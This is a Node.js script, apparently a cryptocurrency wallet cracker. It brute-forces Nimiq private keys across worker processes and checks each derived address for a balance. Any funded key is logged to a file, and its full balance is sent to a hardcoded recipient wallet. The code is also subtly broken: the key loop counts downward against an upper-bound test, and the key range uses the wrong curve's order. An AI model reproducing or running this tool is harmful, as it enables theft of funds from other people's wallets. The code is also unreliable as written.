const cluster = require('cluster');
const EdDSA = require('elliptic').eddsa;
const fs = require('fs');
const HEIGHT_FILE = 'height.txt';

(async () => {
  // args
  const argv = require('minimist')(process.argv.slice(2));
  const numCPUs = argv?.t || 2;

  // Connect
  const Connection = require('./connection');
  const connection = new Connection();
  const wrapper = await connection.connect();

  // Main
  if (cluster.isMaster) {

    if (!fs.existsSync(HEIGHT_FILE)) {
      fs.writeFileSync(HEIGHT_FILE, '0000000000000000000000000000000000000000000000000000000011111111');
    }

    const height = fs.readFileSync(HEIGHT_FILE).toString().trim() || "0000000000000000000000000000000000000000000000000000000011111111";
    const MIN_PRIVATE_KEY = BigInt(`0x${height}`);
    const MAX_PRIVATE_KEY = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364140');

    const rangeSize = (MAX_PRIVATE_KEY - MIN_PRIVATE_KEY) / BigInt(numCPUs);

    for (let i = 0; i < numCPUs; i++) {
      const startKey = MIN_PRIVATE_KEY + (rangeSize * BigInt(i));
      const endKey = (i === numCPUs - 1) ? MAX_PRIVATE_KEY : (startKey + rangeSize - BigInt(1));
      cluster.fork({ START_KEY: startKey.toString(), END_KEY: endKey.toString() });
    }

    cluster.on('exit', (worker, code, signal) => {
      console.log(`Worker ${worker.process.pid} died`);
    });
  } else {
    const getBalance = async (address) => new Promise((resolve) => {
      try {
        wrapper.accountHelper.getBalance(address, (b) => {
          const balance = b / 100000;
          resolve(balance);
        });
      } catch (error) {
        resolve(0);
      }
    });

    const START_KEY = BigInt(process.env.START_KEY);
    const END_KEY = BigInt(process.env.END_KEY);

    let founds = 0;
    let counts = 0;

    for (let key = START_KEY; key <= END_KEY; key = key - BigInt(1)) {
      counts++;

      const privateKeyHex = key.toString(16).padStart(64, '0');
      const wallet = wrapper.accountHelper.importWalletFromHexKey(privateKeyHex);
      const address = wallet._keyPair.publicKey.toAddress().toUserFriendlyAddress();
      const balance = await getBalance(address);

      if (balance > 0) {
        founds++;

        // Write to file
        var successString = `Wallet: [${address}] - Private: [${privateKeyHex}] - Balance: ${balance} NIM\n\n------ Malphite Coder ------\n\n`;
        fs.appendFileSync('./match-private.txt', successString, (err) => {
          if (err) throw err;
        });

        // Create transaction to main wallet
        const wallet = wrapper.accountHelper.importWalletFromHexKey(privateKeyHex);
        const payload = { address: "NQ08 SUEH T0GS PCDJ HUNX Q50H B0M0 ABHA PP03", amount: balance * 100000, fee: 0 };
        wrapper.transactionHelper.sendTransaction(wallet, payload);
      }

      console.log(`[${counts} - ${founds}] Wallet Checked: ${address} | ${privateKeyHex} | ${balance} NIM`);

      if(cluster.worker.id === 1 && privateKeyHex) {
        fs.writeFileSync(HEIGHT_FILE, privateKeyHex);
      }
    }
  }
})()

